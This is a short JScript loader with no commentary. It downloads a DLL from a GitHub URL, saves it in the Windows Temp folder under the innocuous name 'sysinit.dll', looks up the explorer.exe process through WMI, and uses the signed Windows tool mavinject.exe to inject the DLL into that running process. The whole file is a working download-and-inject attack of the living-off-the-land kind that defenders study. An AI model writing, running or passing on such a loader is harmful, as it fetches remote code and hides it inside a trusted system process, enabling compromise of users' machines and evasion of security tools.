var http_obj = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
var stream_obj = new ActiveXObject("ADODB.Stream");
var Shell = new ActiveXObject("shell.application") 
var URL = "https://github.com/RT-KT/2DLLs/raw/master/magic/MixedModeAsm.dll";
var FILENAME = "C:\\Windows\\Temp\\sysinit.dll";
http_obj.open("GET", URL, false)
http_obj.send();
stream_obj.type = 1;
stream_obj.open();
stream_obj.write(http_obj.responseBody);
stream_obj.savetofile(FILENAME, 2);
var process = GetObject("winmgmts:\\\\.\\root\\cimv2")
var colItems = process.ExecQuery("Select * From Win32_Process where name='explorer.exe'")
var objItem = new Enumerator(colItems);
var PID = objItem.item().ProcessID;
Shell.ShellExecute("C:\\Windows\\System32\\mavinject.exe",PID.toString()+" /INJECTRUNNING C:\\Windows\\Temp\\sysinit.dll")